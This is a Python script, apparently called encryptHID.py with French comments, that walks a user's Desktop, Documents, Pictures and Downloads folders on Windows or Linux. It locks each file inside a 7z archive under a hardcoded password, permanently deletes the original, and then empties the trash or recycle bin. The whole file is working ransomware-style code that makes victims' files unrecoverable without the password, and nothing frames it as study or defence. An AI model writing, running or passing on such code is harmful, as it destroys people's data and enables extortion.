import os
import platform
import getpass
import shutil

def install_libraries():
    # Installe les librairies en utilisant pip
    try:
        print("Installation des bibliothèques requises...")
        os.system("pip3 install py7zr send2trash")
        import py7zr
        from send2trash import send2trash
        print("Bibliothèques installées avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'installation des bibliothèques : {e}")

def search_files():
    # Detecte le systeme OS 
    os_type = platform.system()

    if os_type == "Windows":
        # Il cherche des fichiers sous windows
        windows_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Downloads"),
        ]
        return windows_paths
    elif os_type == "Linux":
        # Il cherche des fichiers sous Linux
        linux_paths = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
        ]
        return linux_paths
    else:
        print("Unsupported operating system")
        return None

def create_encrypted_archive(file_path, archive_path, password):
    import py7zr
    #Il cree une archive 7z encrypte avec un mot de passe
    with py7zr.SevenZipFile(archive_path, 'w', password=password) as archive:
        archive.write(file_path)

def delete_file(file_path):
    # il supprime le fichier original
    try:
        os.unlink(file_path)
        print("File permanently deleted.")
    except Exception as e:
        print(f"Error deleting file: {e}")

def empty_trash():
    from send2trash import send2trash
    # il supprime le fichier de maniere permanente sous Linux/windows
    try:
        if platform.system() == "Linux":
            # Linux: supprime fichier sur Trash
            trash_path = os.path.expanduser('~/.local/share/Trash/files')
            for root, dirs, files in os.walk(trash_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    os.unlink(file_path)
            print("Trash emptied.")
        elif platform.system() == "Windows":
            # Windows: supprime fichier sur Recycle Bin
            recycle_bin = os.path.join(os.environ.get('SystemRoot', 'C:\\'), '$Recycle.Bin')
            for root, dirs, files in os.walk(recycle_bin):
                for file in files:
                    file_path = os.path.join(root, file)
                    os.unlink(file_path)
            print("Recycle bin emptied.")
    except Exception as e:
        print(f"Error emptying trash/recycle bin: {e}")

def main():
    # Installe les librairies
    install_libraries()
    os.system("pip3 install py7zr send2trash")

    files_to_encrypt = search_files()
    if files_to_encrypt:
        print("Files found:")
        for directory in files_to_encrypt:
            for root, dirs, files in os.walk(directory):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    print("- {}".format(file_path))
                    # On utilise un mdp tres solide
                    password = "UgWd8e5wX%N2&tq+29CpHd4Wg"
                    #Cree l'archive avec le mdp et encrypte le fichier
                    archive_path = file_path + ".7z"  
                    try:
                        create_encrypted_archive(file_path, archive_path, password)
                        # supprime le fichier
                        delete_file(file_path)
                        print("File encrypted, original permanently deleted.")
                    except Exception as e:
                        print(f"Error encrypting/deleting file: {e}")
        # supprime dans le recycle bin/trash
        empty_trash()
    else:
        print("Unable to find files to encrypt.")

if __name__ == "__main__":
    main()
encryptHID.py
5 KB
